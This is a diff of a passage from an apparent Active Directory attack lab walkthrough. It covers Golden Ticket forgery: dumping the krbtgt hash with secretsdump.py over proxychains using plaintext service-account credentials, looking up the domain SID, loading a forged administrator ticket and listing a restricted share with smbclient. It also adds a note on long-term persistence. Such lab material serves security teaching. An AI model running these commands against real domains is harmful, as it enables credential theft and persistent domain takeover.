@@ -433,13 +433,16 @@ After some 30 seconds the password should be revealed. We have now cracked the p
 
 ### Golden Tickets
 
-With the credentials of the svc_sql - who is a member of domain admins - we can now grab the hashes for all users and services of the domain. But one hash is specifically interesting, that is the krbtgt hash, which is used to sign all Kerberos tickets. With this hash we can impersonate any user or service in the domain - even if the password of the user is reset!!! This is like being able to print our own passports.
+With the credentials of the svc_sql - who is a member of domain admins - we can now grab the hashes for all users and services of the domain. But one hash is specifically interesting, that is the krbtgt hash, which is used to sign all Kerberos tickets. With this hash we can impersonate any user or service in the domain - even if the password of the user is reset!!!  This is like being able to print our own passports.
+
+Note! This is long term domination of the domain. The intruder will be able to impersonate any user, even if their passwords are changed, forever until the krbtgt is changed. However, krbtgt are not frequently changed. It requires resetting the kerberos service account password (twice!) and doing so will take down AD authentications for some time. So you can bet on this not being done at regular intervals unless there are significant proofs of compromoise.
 
 From a command shell paste the following command
 
 ```
 proxychains secretsdump.py crueltesting.com/svc_sql:'SQLServer2026!'@10.0.2.10 -just-dc-user krbtgt
 ```
+![The krbtgt hash revealed](/assets/secretsdump.png)
 
 The output shows the krbtgt hash.
 
@@ -448,8 +451,9 @@ In order to proceed, we now just need to find the SID (security identifier of th
 ```
 proxychains lookupsid.py dc01.crueltesting.com/svc_sql:'SQLServer2026!'@10.0.2.10
 ```
+![SID lookup](/assets/lookupsids.png)
 
-(actually we could also have learned the SID at an earlier stage by the info command on garfields sliver session that gives the user info including the domain SID. But this command is easier than scrolling up or taking notes...)
+(actually we also have learned the SID at an earlier stage by the info command on garfields sliver session that gives the user info including the domain SID. But using lookupsids  command is easier than scrolling up or taking notes...)
 
 Now we create the ticket, using the krbttgt hash and the sid. We will create a ticket for felineadmin who is a domain administrator and has access to everything!
 Copy this command into your command shell on evil
@@ -461,11 +465,13 @@ We save the ticket in the KRB5CCNAME environment variable
 ```
 export KRB5CCNAME=felineadmin.ccache
 ```
+![Golden Ticket Creation](assets/goldenticket.png)
+
 Now we can use smbclient to access the share that we previously had no access to!
 
 From a command shell we paste
 ```
-proxychains4 smbclient //dc01.crueltesting.com/DomainAdminSecret -k -c 'ls'
+proxychains smbclient //dc01.crueltesting.com/DomainAdminSecret -k -c 'ls'
 ```
 (add commands to view the content of the secret file on the share, which should give us a password)
 
